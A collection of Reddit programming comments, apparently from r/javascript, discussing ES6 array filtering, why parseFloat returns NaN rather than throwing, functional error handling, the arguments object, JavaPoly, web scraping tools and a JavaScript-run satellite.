C%20colors%3A%20%5B%22green%22%2C%20%22brown%22%5D%20%7D%2C%0D%0A%20%20%20%20%7B%20id%3A%202%2C%20type%3A%20%22animal%22%2C%20colors%3A%20%5B%22yellow%22%2C%20%22green%22%5D%20%7D%2C%0D%0A%20%20%20%20%7B%20id%3A%203%2C%20type%3A%20%22tree%22%2C%20colors%3A%20%5B%22yellow%22%2C%20%22brown%22%5D%20%7D%0D%0A%5D%3B%0D%0A%0D%0A%2F%2F%20Now%20do%20that%20actual%20filtering%20of%20the%20array.%0D%0Avar%20filteredArray%20%3D%20arr.filter(and(treeFilter%2C%20colorsFilter%29%29%3B%0D%0A%2F%2F%20And%20print%20it%0D%0Aconsole.log(filteredArray%29%3B)
Is Uber pronounced /oober/ or /Ã¼ber/?
That is some seriously cool code! Thanks a ton! Only been working with ES6 for a few weeks, absolutely loving its simplicity! The code is self explanatory I think. The functions returning functions part sounds daunting at first but makes sense.
I'm specifically using React with their Flux methodology. So the array of objects is inside a store. I get what you're saying. The filter logic should not be in there because that's just the data; the filter logic should be in the view and leave the store alone.
X-Post referenced from /r/node by /u/keithwhor [Nodal 0.10 has landed! Async validations, file uploads, new core. :)](https://www.reddit.com/r/node/comments/4iix1q/nodal_010_has_landed_async_validations_file/) ***** ^^I ^^am ^^a ^^bot ^^made ^^for ^^your ^^convenience ^^\(Especially ^^for ^^mobile ^^users). ^^P.S. ^^my ^^negative ^^comments ^^get ^^deleted. ^^[Contact](https://www.reddit.com/message/compose/?to=OriginalPostSearcher) ^^| ^^[Code](https://github.com/papernotes/Reddit-OriginalPostSearcher) ^^| ^^[FAQ](https://github.com/papernotes/Reddit-OriginalPostSearcher#faq)
It is a great post, but it is impossible to read on that background. I needed to use dev tools to remove background image. In addition, I recommend reading http://gajus.com/blog/1/behaviour-driven-development-with-javascript. In contrast to "TDD Should be Fun", it gives more examples illustrating using TDD in practice.
Thanks, their mobile page is somewhat illegible, but I'll have a look later on.
I wouldn't call it dead until Google stop using it. They use it for several actively-supported apps including Google Wallet, Google Flights, Google Docs, Webmaster Tools, and Google Inbox.
That's not a polyfill, though. A polyfill adds functions that are not available in the browser, but can't change the syntax.
If client side and your side have a fixed time difference throughout the year, apply an offset to the locale. If you want to sync stations world wide, you'll need a library. 
Sure it's an accomplished difficult task, however, not quite a positive solution to any problems that cannot be solved in a more efficient manner. The only benefit I see here is "cool, I can use Java on the dom"
Also: /r/threejs
I created a web app in my spare time as NodeJS practice. Let me know what you guys think. Is it even useful? Start by creating a collection and begin adding YouTube videos into it by either grabbing the link directly from YouTube or by clicking the search button on the top right in your collection. You can choose to keep it public or private and share the URL amongst your friends/coworkers/peers. Thanks for looking!
leftpad.jar
great!
If you use Firefox, you can click the little book icon at he right-hand side of the address bar to open Reader Mode. Once you know about it, you're using it more often than you'd expect :)
Since you've modified the localStorage setItem method you could simply do this within the setItem method: localStorage[key] = val; But if other areas of the code are not using your override then you might still need to do the dirty checking as you are. 
Thanks :)
Thanks :)
I came across this resource semi-recently (I want to say I found it on one of the front-end dev subreddits but can't seem to find it again). There's a lot of solid resources in there: https://github.com/JonathanZWhite/AngularJS-Resources I'd also recommend checking out /r/angularjs - their wiki has some good resources: https://www.reddit.com/r/angularjs/wiki/index I believe it's mentioned in there, but when I first started, I really liked Codeschool's tutorial on Angular - I believe the first lesson is free, but then it's a paid resource (though they do free trials for new users I believe).
While easier, I found it that it often does not work great with articles that include code samples, videos, images, etc.
I understand what NaN is. I don't understand why `parseFloat('foo')` returns NaN, when it should scream: You have given me what I cannot parse.
&gt; Seriously, obvious candidates would be interacting with the underlying OS and FS Why? Why is Java better suited than JavaScript for this task? Remember that they're only languages, and if the platform in which they run supports commands for using the file system, then that's all you need. You just need to look at Node.js for a JavaScript environment with file system APIs. Remember that the point of this project is not to recreate Java Applets, but to offer an alternative language to manipulate the DOM and such.
&gt; ooooold [citation needed] Do we know which Java version does this project support?
The reason is that javascript tries to move on and work. It was the designer's decision that it's more acceptable for a field to display "NaN" and move on than having the program fall over. It's the same reason variables you don't declare end up in the global scope instead of giving an undeclared variable error or why "return;" actually returns undefined. It's javascript trying to work. I think this topic is larger than this and involves the philosophy of compiled versus interpreted languages, but ain't nobody got time for that. Like you said, this is not always a good thing.
Works for me: http://i.imgur.com/x6MMqHk.jpg
How is that MDN provides an answer? I am familiar with the stricter parseFloat. However, it too returns `NaN`. It serves a different purpose (making sure that input such as "10foo" does not get converted to `Number(10)`). &gt; It's the same reason variables you don't declare end up in the global scope instead of giving an undeclared variable error Not the case in strict mode.
I just read this subreddit, it's enough of "keeping up to date" for me
Thats probably because you are used to typed languages :P. In this sense it makes total sense to me. You gave it something that can't be interpreted as a number. Its not an error because the argument was expecting a string and got one. I don't think i EVERY situation you want to throw an error when there is a parsing issue. You can detect your own parsing issues via RegExp()
Hi /u/drakar90, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index) (specifically, _Posting: Showing off a Project_). Please use the [Showoff Saturday](https://www.reddit.com/r/javascript/search?sort=new&amp;restrict_sr=on&amp;q=flair%3AShowoff%2BSaturday) posts for these types of submissions.
https://jslive.com/ is great. Also on Twitter and a weekly email.
1) Bad practice 2) Ugly code 3) Can't reuse result
He's the Donald Trump of IT. He says outrageous things and people believe him. That's why he will bring down JavaScript to its knees.
I guess what the designer at the time thought was, well NaN means 'Not a Number', and 'foo' is *definitely* not a number, so... all inputs can be classified as either a number, or Not! (Takes a drag off a joint, holds it in..) Croaking voice: Heeeeey, we don't need an error condition...! (exhales)
Would be a useful tool, except for the existence of eslint and [eslint-import](https://github.com/benmosher/eslint-plugin-import). Why not focus on contributing to the existing framework?
But errors are event mentioned in [ECMAScript 1](http://www.ecma-international.org/publications/files/ECMA-ST-ARCH/ECMA-262,%201st%20edition,%20June%201997.pdf) spec (1997!), e.g. Chapter 16. I distinction between compile and run time of JavaScript can be found there, which I don't get, though. Do you have some more telling resources?
I presume they were talking about an older IE. Neither 8 or 9 are working for me on it. 
aka **How to Make A Small Fraction Of Your Users Hate You Passionately, And The Rest Of Them Just Think That Something Is A Little "Off" About The Scrolling On Your Site**
Thanks for that. It looks like you have a later version of IE than I use. I thought it might work on that and it's one of the things I was going to test. Unfortunately, right now I'm working off my shitty Windows XP laptop because my main PC's power supply failed. I'm currently on IE8. I just get an "error on page" message in the bottom left corner of the browser when I try to click the dropdown button. Do you have any suggestions as to what can be done for older IE?
The reason is that `elements` may not be an array but may be array-like, as is the case for `NodeList`s returned by many DOM methods. The use of `call` allows functions that normally apply to only arrays to apply to array-like objects as well.
I'm no pro, so take this with a grain of salt, but... First, difference: the call method let's you explicitly define the value of `this` within a function, whereas direct invocation does not. And I'm going to go out on a limb and guess (may be way off), that elements is not in fact an array, but instead an array-like html collection. Example: http://codepen.io/anon/pen/RaveMO?editors=1010 So... I assume that's what's going on in your example there.
Damn it. Is there are quick remedy to this?
`_.get()` to the rescue!
If we were to follow your example, then further code logic would evolve as: let input = 'not a number clearly'; const parseFloatResult = parseFloat(input); if (isNaN(parseFloatResult)) { const doSomethingResult = doSomething(parseFloatResult); if (doSomethingResult !== null) { // ... } } However, luckily, this is not how the code is usually structured. Usually, by the time that input reaches a function, you already have expectations about what is the type of the input, i.e. you can safely execute the code as: let input = 'not a number clearly'; const parseFloatResult = parseFloat(input); const doSomethingResult = doSomething(parseFloatResult); // ... The problem is that if parseFloat of doSomething returns anything else than the expected return value, then these is no way to know when your code will break and what damage it will cause along the way. If `parseFloat` and `doSomething` were to throw an Error, you would not need to worry about this. You would know that program execution is interrupted as soon as program receives unexpected input. And you don't need to wrap code in `try..catch` as: let input = 'not a number clearly'; try { const parseFloatResult = parseFloat(input); const doSomethingResult = doSomething(parseFloatResult); // ... } catch (error) { // } You only need to do that if you cannot assert for the input that the program receives and you choose not to validate it. If the program fails in this case - you want it to crash. It is easy to illustrate it by adding a simple safe guard: let input = 'not a number clearly'; if (!canBeParsed(input)) { throw new Error('Invalid input. Stop further execution.'); } const parseFloatResult = parseFloat(input); const doSomethingResult = doSomething(parseFloatResult); // ...
Sure. But when does JaveScript execution still fail sliently, because there were no errors at the beginning? Do know an example? I'm asking this just because it is quite interesting.
I don't like this either. If you want to catch the `type error`, you should be looking for it.
Those words are not pronounced in English as they are in French. Throwing French pronunciation in the middle of an English sentence is likely to inspire eyerolls.
A very naive evolution, maybe. :) I usually compose functions together, where exceptions prove fantastically frustrating towards. Even if you don't do this, you can easily return early, or the many other things to avoid nesting your code like that. &gt;The problem is that if parseFloat of doSomething returns anything else than the expected return value, then these is no way to know when your code will break and what damage it will cause along the way. As opposed to just knowing it'll magically throw an exception, I guess ... ? My point is the return value should include the possibility of error if it has a possibility of error. Your code shouldn't be lying about what it does. 
Nightwatch.js is a wrapper around Selenium Server. It allows you to write End-to-End tests in Javascript (node.js). You can't emulate the DOM in node.js without a library like cheerio or jsdom (mocha-jsdom). You could also set up a headless browser which is the browser with all the APIs but no GUI.
Neat!
&gt; Your code shouldn't be lying about what it does. I lost you there. Can you clarify what you mean?
Thank you very much!
Thank you very much!
If you look at this code: const parseFloatResult = parseFloat(input); const doSomethingResult = doSomething(parseFloatResult); You have absolutely no way of knowing what could throw an error, what is prone to failing, or anything. Based on what you've said you have some kind of top-level error handler that catches these and reports them? Or you just want your program to blow up every single time an error occurs. Aside the fact both are very error-prone in asynchronous code (a good chunk of client-side javascript), you don't even have a way of knowing form looking at this code without simply memorizing what functions throw exceptions. In a sense, exceptions are lying to you, because the code looks pure, as though it has no possibility of throwing errors, but it actually does. *However*, this code: const parseFloatResult = parseFloat(input); if (isNaN(parseFloatResult)) return { isSuccess: false, error: "input not correct format" }; const doSomethingResult = doSomething(parseFloatResult); return { isSuccess: true, value: doSomethingResult }; Shows the "seams" of the possible errors in your application. When you get more functional, the error handling disappears almost entirely. Code which can fail returns a type which indicates that it has the possibility of failing, so composing them together to make bigger units is trivial. If you're curious about more functional error handling, [I've written some comments explaining `Maybe` here](https://www.reddit.com/r/javascript/comments/4iaizp/bailing_out_of_a_composed_function/d2wqylk?context=3). `Maybe` is the most simple error-handling mechanism, but there are many others, including ones that log, or have the errors associated with them for more verbose and fine-grained error-handling. (this is still all ignoring that `try/catch` is simply much more verbose and creates many more blocks than is necessary, but apparently this isn't very convincing to some people)
The first spec was written to document existing behaviour. It was too late to change anything.
Because of backwards compatibility. If parseFloat predates the addition of exceptions then it must have had a way to handle invalid input before that and thus code started to rely on this. Then exceptions were added, but you couldn't break existing sites that were either properly checking for NaN or just running with NaN. If they changed the behavior, then the browser that came out with these changes would have been the browser which "breaks so many sites". Nobody wanted to be that browser. So they kept doing what they were doing before exceptions were added. 
I changed #game_id_selector select:nth-child(2) to #game_id_selector select:nth-child(3) and reloaded webbrick, and it's still blank.
How do I use it to pad my string on the right??
why stop when you can keep going is the philosophy here 
If you can write a better one, ill use it. I'm complementary out of ideas
&gt; [...] the arguments object which is available in all functions. Except arrow functions, though. (() =&gt; arguments)(1, 2, 3) // =&gt; uncaught reference error (function() { return arguments; })(1, 2, 3) // [1, 2, 3]
You could do that if you wanted to. However, you'll find it'll get pretty awkward if your functions have a lot of arguments: someOtherFunctionCall(someFunctionCall(callMeBaby(1), callMeRight(2)), funFunFunction(zoomZoomZoom(4), makeMyHeart(3), goBoomBoomBoom(9))); You can of course space it out so it's a bit easier to read, but there's nothing wrong with just sticking the results in variables either. So neither way is better than the other.
Yup, JS weekly is a big help. There are also some people on Twitter whom I follow (can't think of them off my top of my head). So weekly newsletter, this subreddit, and Twitter. 
I focus entirely on the happy path in my functions as well! function g(gg) { gg = h(gg); if (isNaN(gg)) { return NaN; } // else, do happy path stuff return gg; } move to monadic type (doesn't matter which here, so long as it's an error one) =&gt; function g(gg) { return h(gg).map(result =&gt; { // do happy path stuff ... }) } simplify single statement return into expression =&gt; const g = gg =&gt; h(gg).map(result =&gt; { // do happy path stuff }) eta reduction =&gt; const g = _.flow(h, map(result =&gt; { // do happy path stuff })) Just like with exceptions, errors propagate automatically here, and there's no boilerplate for handling them. However, unlike exceptions, it works gracefully in areas where the stack is unreliable (such as async code) and works very cleanly with function composition. If you're not sure what `map` does in my last two examples over a monadic type, [check out this post I made here not too long ago](https://www.reddit.com/r/javascript/comments/4iaizp/bailing_out_of_a_composed_function/d2wqylk?context=3). It's also *much* less code to write. e: added explanations to the transformations I made
Interesting point. Theyâ€™re not always errors, so I donâ€™t think it quite fits a verifier or linter!
In ES6 you don't really need to use the `arguments` object anymore. ((...args) =&gt; args)(1, 2, 3) // =&gt; [1,2,3]
True! But important to point out that `arguments` is not a thing in arrow functions, I feel.
What about something like this - you can move the map, empty and append calls inside the $.ajax callback. Obvious 'otherOpts' is whatever your ajax call returns. http://codepen.io/anon/pen/zqeeGZ
really cool project.
JS almost never uses exceptions and has **terrible** exception support. You cannot catch an exception of a given type using JS without doing something really ugly like try { // There are very few builtin errors in js throw TypeError("oh no!"); } catch(err) { if (err instanceof TypeError) { // handle error } else { // deal with other possible errors before here throw err; } } So, if JS made parseFloat throw on invalid input like it should (and magically fixed everyone's code), it would probably be an even bigger pain because exception handling is such a pain in JS. Currently, exception are basically just used for logging serious problems in JS. People even throw things like strings, which are an even bigger pain to handle. Oh, and btw, since `parseFloat("Infinity")` returns Infinity, it would make sense that `parseFloat("NaN")` should return an actual NaN (because both Infinity and NaN are defined by the float spec), so you might want to check that your string (trimmed) is not equal to "NaN" in the first place before you treat NaN as an error. Have fun!
Even in modern OO thought, an exception here would be odd. Exceptions are for, well, exceptional behavior. Hence the name. Normal input that a user might reasonably be expected to input to a function cannot be considered exceptional in any reasonable definition of it. This idea that "all errors should be exceptions" is a very odd idea that as far as I can tell from Java/C#-style OO. Though I don't think a functional influence was the result of `NaN` here. `NaN` frustrates type safety by being a bottom value of the `number` type, and is as annoying as `null` is in this respect. We would see some kind of `Result` or `Maybe` monad if it was a functional number parser, since there's obviously a chance that a string is not representable as a number.
What /u/le_chad_ said is great advice. Just add your own id's and then you won't have to muck around with those selectors. And also, try to write raw selectors for the elements you want in the console first so that then you can see if they actually apply for your element and don't have use the ajax calls to see if the elements are actually selected. So for example if you wanted to see if your code actually selects the element that you want, you would type in the console: `var $mySelection = $('#game_id_selector select:nth-child(2)');` and then just see if the `$mySelection` variable references the element you want.
You would download something like [uglifyJs](https://github.com/mishoo/UglifyJS2), likely as part of a workflow that is driven by [grunt](http://gruntjs.com/), [gulp](http://gulpjs.com/), or [webpack](https://webpack.github.io/), through node.
I've updated my codepen above, here is the same link http://codepen.io/anon/pen/zqeeGZ You're so close =) 
I wish we could just move on from ECMA. I understand there are many JS ninjas out there who love the flexibility, but it's not intuitive, and very difficult to read based on the style who wrote it. The frustration shows with all these attempts like "use strong". And the number of "compilers" like: C#-&gt;JS (http://bridge.net), or TypeScript (https://www.typescriptlang.org), or Dart (https://www.dartlang.org). And then all the libraries and tools we use to make it easier. 
yes, you're right - not all functions
Potentially! I don't normally just drop the m-word on people unless they're really in need of it, though. 
Error page.
Interesting. I need to give it more thought.
UPDATE: The best problems are the ones you solve yourself. Having a '#' in the folder name was screwing everything up. Once I removed it, the debugger seems to be running fine. Very cool. I guess a mod can go ahead and close this now. Lesson learned: don't use weird characters in your file tree
Regarding compile vs run time, `s/compile/parse/g` for better understanding. In practice, JS is usually compiled to bytecode before being interpreted (with the hot code paths JITed to machine language), or even directly to machine language (V8).
I don't understand, what did the standardization organization do wrong? Do you think it would be any different with an other organization?
I stopped trying. I got a life to live.
It's /oober/, which threw me off pretty badly, because I thought it was meant to be /Ã¼ber/ and everytime someone said it the other way it sounded just _wrong_ to me. Took me quite a while to get used to it.
Well, for one, you can't use ruby in the HTML section of codepen. If you actually do this on your server (that is running ruby) that should work no problem. Also, the URL of the $.ajax won't work either, codepen has no idea what "games/..." is.
http://deobfuscatejavascript.com/ deobfuscates 95% of this
Had a friend with a chromebook check it out (after updating) and he's seeing that its not supported there as well. So its just Mac chrome that has a leg up here... for now
but I tried it on my server and it didn't work, i just made the codepen so you could see what I did
the only thing left that could be wrong is my controller action class GameController &lt; ApplicationController def get_characters game = FightingGameRoster.all.where(fighting_game_id:params[:game_id]) characters_arr = [] game.each {|char| characters_arr &lt;&lt; [char.fighting_game_character_id] } render json: {data: characters_arr} end end 
Afaik that's what gkkgle tried to do with Dart. Also we're moving towards things like WebAssembly which is kust very early development currently. But what's wrong with a language that compiles to JS?
Updated Question
may i ask how you would go about setting a default property to the o parameter?
[Image](http://imgs.xkcd.com/comics/standards.png) [Mobile](https://m.xkcd.com/927/) **Title:** Standards **Title-text:** Fortunately, the charging one has been solved now that we've all standardized on mini\-USB\. Or is it micro\-USB? Shit\. [Comic Explanation](https://www.explainxkcd.com/wiki/index.php/927#Explanation) **Stats:** This comic has been referenced 2870 times, representing 2.6084% of referenced xkcds. --- ^[xkcd.com](https://www.xkcd.com) ^| ^[xkcd sub](https://www.reddit.com/r/xkcd/) ^| ^[Problems/Bugs?](https://www.reddit.com/r/xkcd_transcriber/) ^| ^[Statistics](http://xkcdref.info/statistics/) ^| ^[Stop Replying](https://reddit.com/message/compose/?to=xkcd_transcriber&amp;subject=ignore%20me&amp;message=ignore%20me) ^| ^[Delete](https://reddit.com/message/compose/?to=xkcd_transcriber&amp;subject=delete&amp;message=delete%20t1_d2z3w6c)
Since your positions and values are effectively random (they're irregular) from array to array, you'll end up having to write a map that informs the correct positions and values. This is effectively what you have in your example. You could abstract the values to vars to save on characters, but you're not really going to save much file size even. Given the extra processing time required to parse the map, I think you're better off using these arrays as written. If you're dead-set on making this a series of loops, you'll need to figure out a pattern within the arrays for what values need to go where relative to which array you're trying to fill. Then you'll need to write that pattern as a function that can output the correct values at the correct times. Stick with the maps you have unless you need to make dozens or hundreds of them.
Could do it a couple of ways, for example: var defaults = { name: "pratchett" }; Object.assign(this, defaults, o);
Start a new side project. Doesn't really matter which, just something a bit outside of your comfort level. Try and do it from memory, then try and see how far you get with a few search results. It'll show you how much you know and where your knowledge gaps are, which will be easy to fill when you have the understanding.
Thanks!
So, proxy is not supported in most browsers and not transpiled by Babel, so I basically did your same proxy with some workarounds let passThroughs = ['toString'] function FunArr(arr) { let fun = { i: arr } for (let proxy of Object.getOwnPropertyNames(Array.prototype)) { Object.defineProperty(fun, proxy, { get: () =&gt; typeof fun.i[proxy] === 'function' ? passThroughs.includes(proxy) ? (...args) =&gt; fun.i[proxy].apply(fun.i,args) : (...args) =&gt; FunArr(fun.i[proxy].apply(fun.i,args)) : fun.i[proxy] }) } fun.log = () =&gt; {console.log(fun.i); return fun} return fun } let x = FunArr([1,2,3]) console.log(x.length) console.log(x.i[0]) x.log() x .filter((e)=&gt;true) .log() // [1,2,3] .filter((e)=&gt;true) console.log(x.toString()) // 1,2,3
Sorry, am noob: What's going on here?
I think they're calling it a polyfill since you can just stick code in a `&lt;script type="text/java"&gt;` with the library loaded and it'll work. I agree that it's not the right word (generally a polyfill only implements missing standard functionality) but I used it in the title since the developer used it on their site. 
Another option, if you have your own Web server, you can make a Google form and get a pre-filled link for your form to get the question IDs so you can construct a URL to submit the form with entry values pulled with jquery from a custom form using a button with an onclick function to pull the data, construct the URL, and redirect. All that would be left would be to hit the submit button. Then you have the apps script run the same way as before based on the form submission version I posted earlier with question 1 being the type of operation you want to do. Reading isn't as easy, but you can link a spreadsheet to a Google site that can be shared on your organization's Google Domain. That can have a filter on it. You may be able to update and such with a Google Site linked to the spreadsheet, but I can't remember exactly. One way to "read" would be to make a form submission script that searches for the info, and then emails the info to the requester. I'm not sure if apps scripts can connect to hangouts, but, if so, you could send a hangout message to the requester with their search results. Personally, I'd probably use the sidebar approach, but it really depends on what you want to do and how. I've used and abused our .org Google apps for nonprofits to do just about everything I could imagine in the last few years, so feel free to send me a message if you want more info.
First - you're right, I'm very much off topic. Obviously they're doing nothing wrong. What I said was more of general frustration with web dev and how often standards change. Since the web is now overcoming client-side development, doing web-dev work feels more difficult than it should be. I can't create a modern app w/o numerous overrides and libraries like jQuery or MVC (knockout.js), and many more. Then every month or year there's a new, different, better library, and has unknown effects on the other libraries you're using. My pipe dream - moving on to a CIL-like platform where there was a single library of high level functions, along with multiple languages/syntaxes could co-exist.
Just be aware that in V8 leaking the arguments object, that is causing the object to leave the scope of the originating function, even through use of `[].slice.call(arguments)` causes a deopt - a severe performance penalty. Refactor the usage of arguments or use a for-loop. Example: // arguments.length is an integer, this doesn't leak the arguments object itself var args = new Array(arguments.length); for(var i = 0; i &lt; args.length; ++i) { // i is always valid index in the arguments object, preventing another deoptimization. args[i] = arguments[i]; }
That sounds reasonably close to what I had in mind (I was thinking maybe a custom menu item + dialog, but I'm open). Right now I'm more interested in getting something that works sooner than later.
This is actually a fairly interesting topic that goes way back to when the floating point spec was first put together. It lives on in the form of signaling vs non signaling NaNs. The reason non signaling won was because it gave you the option, (but didn't force you) to check for errors at any step of the calculation. With exceptions you would either be forced to wrap each individual step in a try/catch if you wanted to recover and continue, or one giant try catch over the whole computation in which case you've lost fine grained control. Essentially an exception makes sense if you only look at it in isolation, but NaN is more pragmatic in a larger chain. Also remember that NaN IS a number, the function isn't returning multiple types of data. 
Regarding 'class' methods, is that automatically handled when transpiling eS6 classes?
I figured out how to use Rhino on it. Be prepared for long wait times. https://gist.github.com/georules/daf05188c510b84460992caf1979d61c
Wonderful! I wonder if you could run JavaPoly using Rhino, and thus nest them infinitely. http://i.imgur.com/OHHvUqT.jpg
www.codewars.com
A [bezier curve](https://en.wikipedia.org/wiki/B%C3%A9zier_curve) is a curved line drawn by following a formula defined by a set of 'control points'. Here is an example of one [drawn with three points](https://upload.wikimedia.org/wikipedia/commons/3/3d/B%C3%A9zier_2_big.gif). This is basically what a bezier curve command does in memory before putting the finished curve on the canvas. OP's code starts by defining two sets of control points on a circle, and then animates. The control points are rotating around the circle, and each frame of animation draws the resulting curve, causing some cool shapes.
If you're using ES6, you can probably make a class that extends Array. Then you won't have to copy properties from Array.prototype into your object. You'll get everything through ordinary inheritance.
Yes, you can do that, but iterative functions will not return an instance of your extended array, but rather, a new regular Array. As /u/senocular, Babel is not currently compatible with this
Awesome! Looking forward to it!
Preference typically doesn't have anything to do with it - the reason one would use `call` is for changing the value `this` inside a function. In the case of [].slice.call(elements) -- this is short hand for `Array.prototype.slice.call(elements)`. Within `Array.prototype.slice` you'll see something along the lines of: var ret = []; for (var x=0; x&lt;this.length; x++) {ret[x] = this[x]} return ret I've omitted the begin/end parameter handling, but for our needs it doesn't matter; the key here is that assuming the object you pass as the first parameter has `length` and a series of numbered properties, 0 to length -- it will return an array with the same values. This is used to turn something that is array-like into a proper array. Things like `NodeList` (the return of `document.querySelectorAll` and `document.getElementsByClassName`, among others) don't have any of the other Array.prototype methods like `forEach` so people will use this cast to turn it into an array to get these utility methods.
ActionScript for the web... drool. Oh wait, that's basically TypeScript.
That's a good question. As mentioned (very briefly) in the article, I'd recommend using something like [Cheerio](https://github.com/cheeriojs/cheerio) or J[SDOM](https://github.com/tmpvar/jsdom) if you really need to test against the DOM API. If you can make those work *without* using something like [mocha-jsdom](https://github.com/rstacruz/mocha-jsdom) or [jsdom-global](https://github.com/rstacruz/jsdom-global), then I would strongly recommend doing things that way. But if you're just getting started, then those libraries might be helpful. You might also want to read [A Gentle Introduction to Javascript Test Driven Development: Part 3](http://jrsinclair.com/articles/2016/gentle-introduction-to-javascript-tdd-html-dom/) as it steps through how to do this kind of thing with Cheerio.
Since you know each array always has 3 elements, you could combine into a single array, and use an index to move between each part. You don't say how you want to loop through it, so this may not be it. Try to explain better what you want to do. Anyway, here's an example. var rgb = [ 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2 ]; var groupLength = 3; // say you want the 3rd group var start = 3 * groupLength; for (var a = start ; a &lt; start + groupLength ; a++) { console.log( rgb[ a ] ); }
Frankly I don't. JavaScript is evolving so quickly that I don't care anymore. I just use what I have to use to get shit done. It sometimes just happens that I learn some new libraries or framework on the way. 
Thank you! Really helped!!!
Minor optimization would be to use `Object.defineProperties()` instead.
Good idea!
It sounds like he wants you to extend the native Object prototype. Object.prototype.extend = function(obj) { console.log(this, obj) // do your stuff here } { hello: "world" }.extend({ foo: "bar" })
I always start with codepen
I would suspect that type coercion would be the original reason. if (20.1 == "20.1") // string is parsed to a number or if (20.1 == "dog") //parsing to number fails Well, for the second case, you would definitely want a false rather than an exception. 
I liked [this website](http://webglfundamentals.org/) for plain WebGL, even though the background on the main page is an atrocity. I tried a few websites but this is the one that got me to the point where I could just make something. It even covers some of the math in detail. For three.js, I've just been looking at the source for the relevant examples on the official site, then referencing the docs for any details that I don't get. They've had examples for everything I've looked up. three.js makes the rendering stuff really simple. The hard part is figuring out how to work in 3d space. You might want to look into general graphics programming tutorials for this. I don't think there's any way to avoid doing a ton of math. If you're into that sort of thing, it's super fun though.
That's pretty fun!
Thank you! 
That's a mark of a professional developer! In this case I used [vuejs webpack template](https://github.com/vuejs-templates/webpack), though the first prototype was done in [jsbin](http://jsbin.com/gebufolazo/edit?html,js) :). 
'firebase' is the name of the module, not the name of an (injectable) service. you probably want $firebaseObject or $firebaseArray - https://www.firebase.com/docs/web/libraries/angular/api.html
Hence the second part of the sentence.
What are you looking to achieve? Request is HTTP client and best one at it for Node. If you do not like callbacks then Node is not for you. If you really want to crawl the web and read the DOM its better to use scriptable headless Webkit. PhantomJs. I use [Horseman](https://github.com/johntitus/node-horseman) to talk to it from Node.
Wow. I knew it. Thank you. I was staring dead at the example and was still doing it wrong. 
You could just wrap the request methods you'll actually use in promises and you'd be set as far as promises goes. If you're looking for lightweight I doubt request is too heavy, but Google may find you some answers there? As for the querying of the DOM, which I'd assume the next step would be, Cheerio is great for that and pretty similar to jQuery. 
request+cheerio+rxjs worked amazingly well for me. I don't know of a framework that incorporates these together though. In the past I've tried request+cheerio, phantomjs, request+cheerio+promises and request+cheerio+most. If you need to execute JavaScript or make screenshots, phantomjs is the way to go, other than that of all of those request+cheerio+rxjs resulted in the most straightforward and cleanest code for scraping. Just a number of map, flatmap, filter and reduce calls with lambda's. 
I have never used Dart, but I remember a lot of people disliking the language, maybe that's why it hasn't taken off.
Very nice reference.
reverse your padding too..or something like that.
If you open job ads for JavaScript consultants (in big cities) and sort jobs by rate, you will find some very interesting work being done using JavaScript. Least to say, a serious bug (such as `NaN` being misinterpreted) in production could cause a lot damage. However, types (Flow type), extensive testing and countless safeguards keeps it safe.
Mithril
I know that it is not your point, but just for record, I was not talking about JavaScript in browser. &gt; Other scripts should not be stopped because one script didn't handled some input correctly. I genuinely cannot think of a scenario where this is true. Note, I am talking about a single program flow. I am not talking about failing a service. isValidInput(maybeValidInput: any): boolean; // Anything that does not produce boolean response must throw error. sanitizeInput(input: string): string; // Anything thats not a valid input must throw an error. fetch(resouceUri: string): Promise&lt;TypeResource|TypeResourceError&gt;; // Anything thats not a valid input must throw an error. Can you suggest a scenario where you would expect different behavior?
For me the many problems of JS are fixed by TS if you REALLY need them. But the problem with JS is performance, especially when you develop a real time heavy computation service, lets say online game. Creating a website with NodeJS/V8 is easy and you can fuck optimizations at all, just remember to not block event loop too long, and your node computation is like 5-10% of whole cpu usage? Rest will go probably to your database storages like mysql/redis/mongo. But making games is different thing. For example you are creating mmorpg game. On server side, you must take care of performance and 99% of code is your own sync code. On client side, you must develop a game to be as performant as possible because while V8 is quite great, Firefox users will have lower framerates if you dont care about them. So you cannot "just sit and program", you must learn whole "rules" like hidden class managment, trying to not allocate in critical parts, recycle objects that are often craeted and destroyed, split execution to several setTimeout's / process.nextTick to not block event loop, use web workers for heavy work like pathfinding etc. If there should be new language for the web, it should work similar to asm.js. That is, it should be compillable to standard ES5 due to web world really long and heavy tail of older browsers that must be supported. It should also come with easy pluggable engine (like V8) that would pick up bytecode and compile it instead if new engine is supported. Developing something that way would be really hard...
unhandled errors in production can also cause serious damage. I'd say even more than a more graceful approach such as NaN.
Related: http://www.haneycodes.net/npm-left-pad-have-we-forgotten-how-to-program/
I don't think Angular seed uses "horizontal modules" as described here.
Hum... What is that thing ? Some kind of buzz based marketing joke ? 
This is a terrible idea ..
Thanks for the information, I'll add a giant disclaimer. I didn't intend for this to be used in any real scenario. It was more of an experiment, but I see your point.
thanks, it worked!
They are transpiled to es5-classes(without SugarSyntax), which gives 100% same results.
Agreed. I'm not sure this is the way to go. I expected to see modules=components, but that's not what this is. I would suggest that anyone looking for a new seed project for Angular, follows the component model of Angular 1.5 and Angular 2. 
The error isn't lost, it's just propagated down the line and you need to check for it only once instead of at each step. You got a NaN - so each step produces NaN until you get to the end. Just like you add `catch()` not for every promise, only at the end of the chain.
If I can buy one I would do it immediately !
A sad day for man kind where a left pad can bring down a satellite.
Hi compteNumero8! I work for Reaktor but not in satellite team. No joke. The guys working on the satellite are (hopefully) going to launch the satellite in autumn 2016. The goal is to bring modern software development practices (and not just nodejs) to space industry and also lower the barrier of entry. We've already managed to do that in the aviation industry and that helped our customer to create a better in flight experience for their customers. 
I really appreciate the response. the Gunning fog index information was ultimately what my dad was looking for - i.e. what does % complex words "mean"? 
only if you try to run npm install from the satellite himself :v But good one :p
thanks! :)
I was under the impression that the barrier to entry is cost, and that the reason the space industry (specifically NASA) uses such strict, relatively old fashioned practices is because it costs too much to get wrong.
&gt;The key is the ability to use JavaScript, one of the most popular, **quirky and hated** programming languages in the world. Corrected for you :)
Fetch really solves a lot of the problems with the old API, and there is a library to use it on the backend as well
You're not wrong. They use languages like C because that shit needs to work every time no matter what happens. 
Thought the buble was a typo at first, [but nope](https://gitlab.com/Rich-Harris/buble). Bit of a shame we seem to only be able to do "no configuration" or "more configuration then you'd ever need" without some kind of sensible defaults to sit in the middle.
It's not at all a bug. It's how they wanted it to work for the reasons I said
